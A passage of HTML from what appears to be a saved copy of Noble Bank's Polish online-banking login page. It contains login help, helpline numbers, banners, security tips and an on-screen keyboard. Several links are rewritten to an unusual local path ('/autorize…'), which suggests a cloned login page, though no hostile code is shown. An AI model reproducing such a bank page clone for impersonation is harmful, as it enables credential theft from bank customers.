      </div>
      <hr>

        <div>
          <div id="login-help-heading-three" class="hideAllCollapseLoginHelp">
            <div class="mb-0">
              <div class="collapsed collapsable toggleLoginHelpArrow" type="button" data-toggle="collapse" data-target="#login-help-collapse-three" aria-expanded="false" aria-controls="login-help-collapse-three">
                <div class="login-help-heading">Problem z hasłem<i class="icon icon--more-black login-help-heading-arrow"></i></div>
              </div>
            </div>
          </div>
          <div id="login-help-collapse-three" class="collapse" aria-labelledby="login-help-heading-three" data-parent="#login-help-accordion">
            <div class="login-help-body">
                <p>Jeśli zapomniałeś hasła, skorzystaj z możliwości samodzielnego zrestartowania hasła na stronie. Na stronie logowania wpisz swój login i kliknij przycisk dalej. Na kolejnym ekranie zobaczysz przycisk „Nie pamiętam hasła”- wybierz go i postępuj zgodnie z instrukcjami na stronie.</p>
            </div>
          </div>
        </div>
      <hr>

      <div>
        <div id="login-help-heading-two" class="hideAllCollapseLoginHelp">
          <div class="mb-0">
            <div class="collapsed collapsable toggleLoginHelpArrow" data-toggle="collapse" data-target="#login-help-collapse-two" aria-expanded="false" aria-controls="login-help-collapse-two">
              <div class="login-help-heading">Jak samodzielnie odblokować bankowość internetową?<i class="icon icon--more-black login-help-heading-arrow"></i></div>
            </div>
          </div>
        </div>
        <div id="login-help-collapse-two" class="collapse" aria-labelledby="login-help-heading-two" data-parent="#login-help-accordion">
          <div class="login-help-body">
              <p>Jeśli zablokowałeś już Bankowość Internetową (np. błędnie wpisując hasło), to w łatwy sposób odblokujesz ten kanał dostępu samodzielnie:</p>
              <ol>
                  <li>Jeśli używasz aplikacji Getin Mobile, zaloguj się, a następnie w menu wybierz Ustawienia/Kanały dostępu do Banku, Bankowość Internetowa – Odblokuj</li>
                  <li>Możesz skorzystać z przycisku Odblokuj dostępnym po wpisaniu loginu konta, które zostało zablokowane, zostaniesz przekierowany do formularza. Postępuj zgodnie z instrukcjami na ekranie.</li>
              </ol>
          </div>
        </div>
        <hr>
      </div>

      <div>
        <div id="login-help-heading-one" class="hideAllCollapseLoginHelp">
          <div class="mb-0">
            <div class="collapsed collapsable toggleLoginHelpArrow" data-toggle="collapse" data-target="#login-help-collapse-one" aria-expanded="false" aria-controls="login-help-collapse-one">
              <div class="login-help-heading">Jak zalogować się po raz pierwszy? <i" class="icon icon--more-black login-help-heading-arrow"></i"></div>
            </div>
        </div>
        <div id="login-help-collapse-one" class="collapse" aria-labelledby="login-help-heading-one" data-parent="#login-help-accordion">
          <div class="login-help-body">
              <ol>
                  <li>Na stronie www.getinbank.pl kliknij w przycisk <strong>ZALOGUJ</strong></li>
                  <li>Podczas pierwszego logowania przygotuj swój <strong>login</strong> (znajdziesz go w wiadomości powitalnej e-mail z Banku oraz na umowie).</li>
                  <li>Do pierwszego logowania wykorzystaj <strong>hasło startowe</strong>, które otrzymałeś w wiadomości SMS.</li>
                  <li>Zmień hasło na własne. Możesz nadać dowolne hasło, które będzie Ci łatwo zapamiętać. Pamiętaj, że hasło powinno być trudne do odgadnięcia przez osoby postronne. W tym miejscu możesz też zdecydować czy w przyszłości będziesz podawać hasło w całości, czy tylko wybrane znaki. <strong>Podczas każdego kolejnego logowania należy używać tylko nowego hasła.</strong></li>
                  <li>Podaj <strong>kod SMS</strong>. Otrzymasz go po wpisaniu swojego nowego hasła.</li>
                  <li>Aby przyspieszyć logowanie możesz dodać własne urządzenie do <strong>Zarejestrowanych urządzeń</strong>. Podczas logowania na takim urządzeniu wystarczy podanie loginu i hasła.</li>
              </ol>
          </div>
        </div>
        <hr>
      </div>
    </div>
</div>


</div></section>    <section class="h--section-gray margin0 slide_section" id="help_section">
    <div class="question-help">Masz pytania?</div>
    <div class="h--box-title">pomoc</div>    
    <div class="h--btn h--btn-wide small h--btn-white noble-hide" id="login_help">
    <div class="help-contener"><i class="icon icon--help-mark"></i> Pomoc dotycząca logowania</div>
    <i id="more_help" class="icon icon--more-black"></i>
</div>

<div id="help-box" style="display:none;">


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-wyglada-pierwsze-logowanie" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">1.</div>
        <div class="right-help">Jak wygląda pierwsze logowanie?</div>
    </a>
    <div class="left-help border-help background-white"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-login" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">2.</div>
        <div class="right-help">Czym jest login?</div>
    </a>
    <div class="left-help border-help background-white"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-zmienic-login-do-bankowosci-internetowej" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">3.</div>
        <div class="right-help">Jak zmienić login do Bankowości Internetowej?</div>
    </a>
    <div class="left-help border-help background-white"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-haslo" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">4.</div>
        <div class="right-help">Czym jest hasło?</div>
    </a>
    <div class="left-help border-help"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa" target="_blank" class="h--btn-white h--btn h--btn-wide help-question mb-1">
        <div class="more-question">WIĘCEJ PYTAŃ</div>
    </a>

</div>

    
    <a class="h--btn h--btn-wide h--btn-white help-list" href="http://noblebank.pl/uslugi/bankowosc-internetowa/bankowosc-bezpieczenstwo" target="_blank"><i class="icon icon--help-security"></i> Zasady bezpiecznej bankowości</a>
    <a class="h--btn h--btn-wide h--btn-white help-list" href="http://demo.noblebank.pl/" target="_blank"><i class="icon icon--help-demo"></i> Demo Bankowości Internetowej</a>
    <a class="h--btn h--btn-wide h--btn-white help-list noble-hide" href="/autorize1649694540342573" target="_blank"><i class="icon icon--help-phone"></i> Bankowość Telefoniczna</a>
    <a class="h--btn h--btn-wide h--btn-white help-list" href="http://noblebank.pl/uslugi/bankowosc-internetowa/bankowosc-mobilna" target="_blank"><i class="icon icon--help-mobile"></i> Bankowość Mobilna</a>
    
   



<div class="help-phone-mobile phone-display">
    <a class="h--btn h--btn-wide h--btn-white help-list help-phone" href="tel:+48 (22) 203 03 03" target="_blank">
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 (22) 203 03 03<p>z telefonów komórkowych i stacjonarnych</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" href="tel:+48326043001" target="_blank">    
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="/autorize1649694540342573" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
</div>



<div class="help-phone-mobile screen-display">
    <a class="h--btn h--btn-wide h--btn-white help-list help-phone" target="_blank">    
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 (22) 203 03 03<p>z telefonów komórkowych i stacjonarnych</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" target="_blank">    
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="/autorize1649694540342573" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
</div>



<div class="help-phone-descop">
    <div class="h--btn h--btn-wide small midgray help-phone first-tel"><i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 (22) 203 03 03<p>z telefonów komórkowych i stacjonarnych</p>
        </div></div>

    <div class="h--btn h--btn-wide small midgray help-phone noble-hide"><i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
        </div></div>

    <p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p>
</div>
</section>    <div class="login-info clearfix">
            <div class="wrapper-help">
            <div class="wrapper">
                <header><h3>Potrzebujesz pomocy?</h3></header>
                <div class="h--btn h--btn-wide small h--btn-white mobile-help-list">
                <p>Pomoc</p><i id="show_help_mobile" class="icon icon--more-black"></i>
                </div>

                <div class="show-helpbox-mobile">
                    <div class="h--btn h--btn-wide small h--btn-white noble-hide" id="login_help_mobile">
    <div class="help-contener"><i class="icon icon--help-mark"></i> Pomoc dotycząca logowania</div>
    <i id="more_help_mobile" class="icon icon--more-black"></i>
</div>

<div id="help-box-mobile" style="display:none;">


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-wyglada-pierwsze-logowanie" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">1.</div>
        <div class="right-help">Jak wygląda pierwsze logowanie?</div>
    </a>
    <div class="left-help border-help background-white"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-login" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">2.</div>
        <div class="right-help">Czym jest login?</div>
    </a>
    <div class="left-help border-help background-white"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-zmienic-login-do-bankowosci-internetowej" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">3.</div>
        <div class="right-help">Jak zmienić login do Bankowości Internetowej?</div>
    </a>
    <div class="left-help border-help background-white"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-haslo" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
        <div class="left-help">4.</div>
        <div class="right-help">Czym jest hasło?</div>
    </a>
    <div class="left-help border-help"></div>
    <div class="right-help border-help"></div>


    <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa" target="_blank" class="h--btn-white h--btn h--btn-wide help-question mb-1">
        <div class="more-question">WIĘCEJ PYTAŃ</div>
    </a>

</div>

    
    <a class="h--btn h--btn-wide h--btn-white help-list" href="http://noblebank.pl/uslugi/bankowosc-internetowa/bankowosc-bezpieczenstwo" target="_blank"><i class="icon icon--help-security"></i> Zasady bezpiecznej bankowości</a>
    <a class="h--btn h--btn-wide h--btn-white help-list" href="http://demo.noblebank.pl/" target="_blank"><i class="icon icon--help-demo"></i> Demo Bankowości Internetowej</a>
    <a class="h--btn h--btn-wide h--btn-white help-list noble-hide" href="/autorize1649694540342573" target="_blank"><i class="icon icon--help-phone"></i> Bankowość Telefoniczna</a>
    <a class="h--btn h--btn-wide h--btn-white help-list" href="http://noblebank.pl/uslugi/bankowosc-internetowa/bankowosc-mobilna" target="_blank"><i class="icon icon--help-mobile"></i> Bankowość Mobilna</a>
    
   



<div class="help-phone-mobile phone-display">
    <a class="h--btn h--btn-wide h--btn-white help-list help-phone" href="tel:+48 (22) 203 03 03" target="_blank">
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 (22) 203 03 03<p>z telefonów komórkowych i stacjonarnych</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" href="tel:+48326043001" target="_blank">    
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="/autorize1649694540342573" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
</div>



<div class="help-phone-mobile screen-display">
    <a class="h--btn h--btn-wide h--btn-white help-list help-phone" target="_blank">    
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 (22) 203 03 03<p>z telefonów komórkowych i stacjonarnych</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" target="_blank">    
        <i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
        </div></a>

    <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="/autorize1649694540342573" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
</div>



<div class="help-phone-descop">
    <div class="h--btn h--btn-wide small midgray help-phone first-tel"><i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 (22) 203 03 03<p>z telefonów komórkowych i stacjonarnych</p>
        </div></div>

    <div class="h--btn h--btn-wide small midgray help-phone noble-hide"><i class="icon icon--phone"></i>
        <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
        </div></div>

    <p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p>
</div>
                
                </div>
                <div class="helpbox-margin-mobile"></div>
                <div class="banner">

                    <div class="content">
    <div class="banner">
                    <div class="banner-container">
                <style>
.banner a{text-decoration: none;}
.banner h2{font-size: 48px;margin: 0px;}
.banner-middle p{position: absolute;bottom: 0;margin: 0px;}
.banner-bi-title_nw{color: #2A2C31;font-size: 16px!important;margin: 0px;margin-top:18px;margin-bottom: 22px;padding: 0px;line-height: 22px}
.banner-bi-content-tall_nw{font-size: 12px!important;margin-top: -7px!important;color: #2a2c31;}
.banner-bi-content-tall_logo{font-size: 12px!important;margin:-10px 0px 0px 0px!important;color: #2a2c31;}
.banner-bi-more{border-bottom: 1px dotted #9b9b9b;bottom: 24px;color: #2a2c31;display: inline-block;float: left;font-size: 10px;padding-bottom: 2px;position:absolute;text-decoration: none;margin-top: 25px;margin-bottom: -20px;}a{text-decoration: none;}
.banner-bi-nl{width:458px;height: 150px;margin-bottom: 20px;}
.banner-bi-nl-pic{float: left;height: 100%;width: 150px;}
.banner-bi-nl-main{float: right;height: 150px;width: 308px;position:relative;background-color: #FFF;}
    @media (max-width: 1200px) {
      .banner-bi-nl{
        width: 375px!important;
      }
      .banner-bi-nl-main{
        width: 225px!important;
      }
    }
    @media (max-width: 959px) {
      .banner-bi-nl{
        width: 486px!important;
      }
      .banner-bi-nl-main{
        width: 336px!important;
      }
    }
    @media (max-width: 767px) {
      .banner-bi-nl{
        width: 344px!important;
      }
      .banner-bi-nl-main{
        width: 194px!important;
      }
    }
  </style>
  <div class="banner-bi-nl">
        <a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/biuro-prasowe/getin-noble-bank-na-podium-rankingu-przyjazny-bank-newsweeka-w-dwoch-kategoriach.html">
            <div class="banner-bi-nl-pic">
                <img src="./noble_files/BISecure_Newsweek_2021.jpg" alt="Newsweek_2021">
            </div>
            <div class="banner-bi-nl-main">
                <div style="margin-left: 16px;">
                  <p class="banner-bi-title_nw">Witamy w banku z najlepszą<br>jakością obsługi!</p>
                  <p class="banner-bi-content-tall_nw">Zostaliśmy ponownie docenieni  </p>
          <p class="banner-bi-content-tall_nw">w rankingu Przyjazny Bank Newsweeka 2021. </p>
          
                  <div class="banner-bi-more">
                      Sprawdź
                      <i class="icon icon--arrow-right-mark" style="float: right"></i>
                  </div>
                </div>
            </div>
        </a>
    </div>            </div>
                    <div class="banner-container">
                <style>
.banner a{text-decoration: none;}
.banner h2{font-size: 48px;margin: 0px;}
.banner-middle p{position: absolute;bottom: 0;margin: 0px;}
.banner-bi-title{color: #2A2C31;font-size: 16px!important;margin: 0px;margin-top:18px;margin-bottom: 22px;padding: 0px;line-height: 22px}
.banner-bi-content-tall{font-size: 12px!important;margin-top: -7px!important;color: #2a2c31;}
.banner-bi-content-tall_logo{font-size: 12px!important;margin:-10px 0px 0px 0px!important;color: #2a2c31;}
.banner-bi-more{border-bottom: 1px dotted #9b9b9b;bottom: 24px;color: #2a2c31;display: inline-block;float: left;font-size: 10px;padding-bottom: 2px;position:absolute;text-decoration: none;margin-top: 25px;margin-bottom: -20px;}a{text-decoration: none;}
.banner-bi-nl{width:458px;height: 150px;margin-bottom: 20px;}
.banner-bi-nl-pic{float: left;height: 100%;width: 150px;}
.banner-bi-nl-main{float: right;height: 150px;width: 308px;position:relative;background-color: #FFF;}
    @media (max-width: 1200px) {
      .banner-bi-nl{
        width: 375px!important;
      }
      .banner-bi-nl-main{
        width: 225px!important;
      }
    }
    @media (max-width: 959px) {
      .banner-bi-nl{
        width: 486px!important;
      }
      .banner-bi-nl-main{
        width: 336px!important;
      }
    }
    @media (max-width: 767px) {
      .banner-bi-nl{
        width: 344px!important;
      }
      .banner-bi-nl-main{
        width: 194px!important;
      }
    }
  </style>
  <div class="banner-bi-nl">
        <a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/ubezpieczenia/ubezpieczenie-nieruchomosci-moj-bezpieczny-dom.html">
            <div class="banner-bi-nl-pic">
                <img src="./noble_files/BISecure_Nieruchomosci.jpg" alt="Bezpieczny Dom">
            </div>
            <div class="banner-bi-nl-main">
                <div style="margin-left: 16px;">
                  <p class="banner-bi-title">Kończy się ubezpieczenie<br>Twojej nieruchomości?</p>
                  <p class="banner-bi-content-tall">Ubezpiecz się wygodnie  </p>
          <p class="banner-bi-content-tall">w Bankowości Internetowej lub Mobilnej.</p>
                  <div class="banner-bi-more">
                      Sprawdź
                      <i class="icon icon--arrow-right-mark" style="float: right"></i>
                  </div>
                </div>
            </div>
        </a>
    </div>            </div>
                    <div class="banner-container">
                <style>
.banner a{text-decoration: none;}
.banner h2{font-size: 48px;margin: 0px;}
.banner-middle p{position: absolute;bottom: 0;margin: 0px;}
.banner-bi-title{color: #2A2C31;font-size: 16px!important;margin: 0px;margin-top:18px;margin-bottom: 22px;padding: 0px;line-height: 22px}
.banner-bi-content-tall{font-size: 12px!important;margin-top: -7px!important;color: #2a2c31;}
.banner-bi-content-tall_logo{font-size: 12px!important;margin:-10px 0px 0px 0px!important;color: #2a2c31;}
.banner-bi-more{border-bottom: 1px dotted #9b9b9b;bottom: 24px;color: #2a2c31;display: inline-block;float: left;font-size: 10px;padding-bottom: 2px;position:absolute;text-decoration: none;margin-top: 25px;margin-bottom: -20px;}a{text-decoration: none;}
.banner-bi-nl{width:458px;height: 150px;margin-bottom: 20px;}
.banner-bi-nl-pic{float: left;height: 100%;width: 150px;}
.banner-bi-nl-main{float: right;height: 150px;width: 308px;position:relative;background-color: #FFF;}
    @media (max-width: 1200px) {
      .banner-bi-nl{
        width: 375px!important;
      }
      .banner-bi-nl-main{
        width: 225px!important;
      }
    }
    @media (max-width: 959px) {
      .banner-bi-nl{
        width: 486px!important;
      }
      .banner-bi-nl-main{
        width: 336px!important;
      }
    }
    @media (max-width: 767px) {
      .banner-bi-nl{
        width: 344px!important;
      }
      .banner-bi-nl-main{
        width: 194px!important;
      }
    }
  </style>
  <div class="banner-bi-nl">
        <a target="_blank" href="https://www.getinbank.pl/bankowosc-osobista/karty-platnicze/platnosci-blik.html#promocja">
            <div class="banner-bi-nl-pic">
                <img src="./noble_files/BI_secure_blikomania_082021.jpg" alt="Blikomania">
            </div>
            <div class="banner-bi-nl-main">
                <div style="margin-left: 16px;">
                  <p class="banner-bi-title">Na szczęście masz BLIKA!</p>
                  <p class="banner-bi-content-tall">Wygraj nawet 100 000 zł w BLIKOMANII!</p>
          <p class="banner-bi-content-tall">Korzystaj z BLIKA, aby codziennie mieć szansę na nagrody!</p>
          <p class="banner-bi-content-tall">Loteria trwa do 28.11.2021 r.</p>
                  <div class="banner-bi-more">
                      Więcej
                      <i class="icon icon--arrow-right-mark" style="float: right"></i>
                  </div>
                </div>
            </div>
        </a>
    </div>            </div>
            </div>
</div>
                </div>
            </div>
        </div>
    </div>
    <section class="h--section-gray margin0 slide_section" id="msg_section" style="height: 782px;">
    <p class="mgs_title"></p>

    <p class="title-wide"><span class="mgs_date"></span></p>

    <div class="mgs_content scrollMe nano" style="height:250px;" id="1637430500392_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 250px; transform: translate(0px, 0px);"></div></div></div>
    <div class="bt">
        <a class="h--btn-text-gray hideMgsSection">← schowaj wiadomość</a>
    </div>
</section>            <section class="h--section-white no-padding presentationWindow" style="display:none;">
    <iframe src="./noble_files/107563031.html" width="500" height="281" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe> <p><a href="https://vimeo.com/107563031">noble bank wersja odswiezona bez bilansu v2</a> from <a href="https://vimeo.com/user18714997">Noble Bank</a> on <a href="https://vimeo.com/">Vimeo</a>.</p>
</section>        
</div>
<div class="section-footer">
    <div class="section-help-secure">

        <div class="section-help">

            <h4>Pomoc</h4>
            <div class="help-guild">
                
                                    <div class="noble-hide"><a target="_blank" href="/autorize1649694540342573">Pierwsze logowanie</a><br></div>
                    <div><a target="_blank" href="https://www.noblebank.pl/dokumenty/instrukcja-odblokowania-dostepu-do-bankowosci-internetowej.pdf">Odblokowanie dostępu</a><br></div>
                                            <div><a target="_blank" href="/autorize1649694540342573#management/remindLogin">Przypomnienie loginu</a><br></div>
                                        <div><a target="_blank" href="https://www.noblebank.pl/dokumenty/instrukcja-przypomnienia-hasla.pdf">Reset hasła</a><br></div>
                    <div><a target="_blank" href="http://demo.noblebank.pl/">Demo Bankowości</a><br></div>
                    <div class="noble-hide"><a target="_blank" href="/autorize1649694540342573">FAQ</a><br></div>
                    <div id="more-info-security"><a target="_blank" href="https://www.noblebank.pl/bezpieczna-bankowosc">Więcej o bezpieczeństwie</a></div>
                            </div>           
            
        </div>

        <div class="section-secure">
            
            <h4 class="no_show_rules">Podstawowe zasady bezpieczeństwa</h4>
            <h4 class="show_rules">Podstawowe zasady bezpieczeństwa <i id="show_rules" class="icon icon--more-black"></i></h4>

            <div class="rules">
                <div class="rule">
                    <div class="numbers bold">1</div>
                    <div class="description bold">
                        Dokładnie sprawdzaj, czy informacje zawarte w SMSie autoryzacyjnym są zgodne z danymi transakcji. Zwróć uwagę czy zgadza się numer rachunku i kwota transakcji.
                    </div>
                </div>
                <div class="rule">
                    <div class="numbers bold">2</div>
                    <div class="description bold">
                                                    Zawsze loguj się przez stronę www.noblebank.pl. Sprawdź przed zalogowaniem, czy widzisz https w adresie strony i czy połączenie jest szyfrowane.
                                            </div>
                </div>
                <div class="rule">
                    <div class="numbers">3</div>
                    <div class="description">
                        Nie odpowiadaj na wiadomości od podejrzanych nadawców, nie otwieraj załączników tych wiadomościach i nie korzystaj z zawartych w nich linków.
                    </div>
                </div>
            </div>

            <div class="rules2">
                <div class="rule">
                    <div class="numbers">4</div>
                    <div class="description">
                        Nie udostępniaj osobom trzecim loginu i hasła do Twojej Bankowości Internetowej i Mobilnej oraz kodów autoryzacyjnych.
                    </div>
                </div>
                <div class="rule">
                    <div class="numbers">5</div>
                    <div class="description">
                        Hasła do Bankowości, nie wykorzystuj w innych serwisach, np. społecznościowych.
                    </div>
                </div>
                <div class="rule">
                    <div class="numbers">6</div>
                    <div class="description">
                        Korzystaj z aktualnych wersji systemu operacyjnego, przeglądarek internetowych i programów antywirusowych.
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="clearfix mb-7"></div>

<div class="section-copyright">
    <div class="section-copyright-left">
                    <p class="footer-green">© 2022 Noble Bank</p>
            </div>

    <div class="section-copyright-right">
        <p class="footer-green">Jesteśmy częścią Getin Noble Bank S.A.</p>
        <p class="footer-swift">SWIFT: GBGCPLPK</p>
    </div>
</div>


  
</div>

    
<section class="h--section-black margin0 keyboard_wrapper">
    <button type="button" class="h--btn h--btn-white h--red-hover showKeyboard actionshowkeyboard prepend-icon"><i class="icon icon--close3"></i>zamknij</button>
    <ul id="keyboard">
        <li class="symbol"><span class="off">1</span><span class="on">!</span></li>
        <li class="symbol"><span class="off">2</span><span class="on">@</span></li>
        <li class="symbol"><span class="off">3</span><span class="on">#</span></li>
        <li class="symbol"><span class="off">4</span><span class="on">$</span></li>
        <li class="symbol"><span class="off">5</span><span class="on">%</span></li>
        <li class="symbol"><span class="off">6</span><span class="on">^</span></li>
        <li class="symbol"><span class="off">7</span><span class="on">&amp;</span></li>
        <li class="symbol"><span class="off">8</span><span class="on">*</span></li>
        <li class="symbol"><span class="off">9</span><span class="on">(</span></li>
        <li class="symbol"><span class="off">0</span><span class="on">)</span></li>
        <li class="symbol"><span class="off">-</span><span class="on">_</span></li>
        <li class="symbol"><span class="off">=</span><span class="on">+</span></li>
        <li class="delete lastitem" style="width: 134px;">Backspace</li>
        <li class="tab symbol"><span class="off">`</span><span class="on">~</span></li>
        <li class="letter">q</li>
        <li class="letter">w</li>
        <li class="letter">e</li>
        <li class="letter">r</li>
        <li class="letter">t</li>
        <li class="letter">y</li>
        <li class="letter">u</li>
        <li class="letter">i</li>
        <li class="letter">o</li>
        <li class="letter">p</li>
        <li class="symbol"><span class="off">[</span><span class="on">{</span></li>
        <li class="symbol"><span class="off">]</span><span class="on">}</span></li>
        <li class="symbol lastitem"><span class="off">\</span><span class="on">|</span></li>
        <li class="capslock">Caps lock</li>
        <li class="letter">a</li>
        <li class="letter">s</li>
        <li class="letter">d</li>
        <li class="letter">f</li>
        <li class="letter">g</li>
        <li class="letter">h</li>
        <li class="letter">j</li>
        <li class="letter">k</li>
        <li class="letter">l</li>
        <li class="symbol"><span class="off">;</span><span class="on">:</span></li>
        <li class="symbol"><span class="off">'</span><span class="on">"</span></li>
        <li class="return lastitem">Enter</li>
        <li class="left-shift">Shift</li>
        <li class="letter">z</li>
        <li class="letter">x</li>
        <li class="letter">c</li>
        <li class="letter">v</li>
        <li class="letter">b</li>
        <li class="letter">n</li>
        <li class="letter">m</li>
        <li class="symbol"><span class="off">,</span><span class="on">&lt;</span></li>
        <li class="symbol"><span class="off">.</span><span class="on">&gt;</span></li>
        <li class="symbol"><span class="off">/</span><span class="on">?</span></li>
        <li class="right-shift lastitem">Shift</li>
        <li class="space lastitem">Space</li>
    </ul>
</section>            

         <div class="h--overlay-white">
        <img src="./noble_files/loader.gif">
        <div class="waitMsg"></div>
    </div>
    <div class="h--overlay-white-announcements">
        <img src="./noble_files/loader.gif">
    </div>
    <div class="h--overlay-white-setings" style="zoom: 1;">
        <img src="./noble_files/loader.gif">
    </div>

    <div class="container">
    <div class="row h--overlay-credit-pa otherCase popup-overlay">
        <div class="col-xs-8 col-md-6 col-sm-8 center popup-credit-pa">
    <div class="row">
                    <div class="actions">
                <div class="float-right">
                    <button type="button" class="button-close"><i class="icon icon--close"></i></button>
                </div>
            </div>
                <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="title mt-15">Obecnie w systemie posiadasz już rozpoczęty wniosek.</div>
        </div>
        <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="description">Wskaż, który wniosek chcesz kontynuować?</div>
        </div>
            </div>
    <div class="row menu mb10">
        <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="table">
                                    <div class="row">
                        <div class="col-xs-6 col-md-6 col-sm-6 no-mobile">

                            <div class="max table"><a class="button-close-and-new"><span class="text-decoration">Nowy wniosek</span></a></div>                        </div>
                        <div class="col-xs-6 col-md-6 col-sm-6  no-mobile">
                            <div class="max table">
                                <a href="/autorize1649694540342573#creditpa/index/" class="button-continue">Poprzedni wniosek</a>                            </div>
                        </div>
                        <div class="col-xs-12 col-md-6 col-sm-6 mobile">
                            <div class="max table">
                                <a href="/autorize1649694540342573#creditpa/index/" class="button-continue">Poprzedni wniosek</a>
                            </div>
                        </div>
                        <div class="col-xs-12 col-md-6 col-sm-6 mobile">
                            <div class="max table"><a class="button-close-and-new"><span class="text-decoration">Nowy wniosek</span></a></div>                        </div>
                    </div>
                            </div>
        </div>
    </div>
</div>
<div class="blur">
</div>    </div>
</div>
<div class="container">
    <div class="row h--overlay-credit-pa errorCase popup-overlay">
        <div class="col-xs-8 col-md-6 col-sm-8 center popup-credit-pa">
    <div class="row">
                <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="title ">System chwilowo niedostępny</div>
        </div>
        <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="description">Prosimy spróbować później.</div>
        </div>
            </div>
    <div class="row menu mb10">
        <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="table">
                                    <div class="row">
                        <div class="col-md-9 site-main">
                            <div class="max table">
                                <a class="button-accept come-back">Powrót do bankowości</a>                            </div>
                        </div>
                    </div>
                            </div>
        </div>
    </div>
</div>
<div class="blur">
</div>    </div>
</div>
<div class="container">
    <div class="row h--overlay-credit-pa unContinueCase popup-overlay">
        <div class="col-xs-8 col-md-6 col-sm-8 center popup-credit-pa">
    <div class="row">
                    <div class="actions">
                <div class="float-right">
                    <button type="button" class="button-close"><i class="icon icon--close"></i></button>
                </div>
            </div>
                <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="title mt-15">Obecnie w systemie posiadasz już rozpoczęty wniosek.</div>
        </div>
        <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="description">Niestety nie ma możliwości jego kontynuowania w Bankowości Elektronicznej. Wybierając Nowy wniosek, poprzedni zostanie anulowany i rozpoczniesz nowe wnioskowanie o produkt kredytowy.</div>
        </div>
            </div>
    <div class="row menu mb10">
        <div class="col-xs-12 col-md-12 col-sm-12">
            <div class="table">
                                    <div class="row">
                        <div class="col-xs-6 col-md-6 col-sm-6 no-mobile">

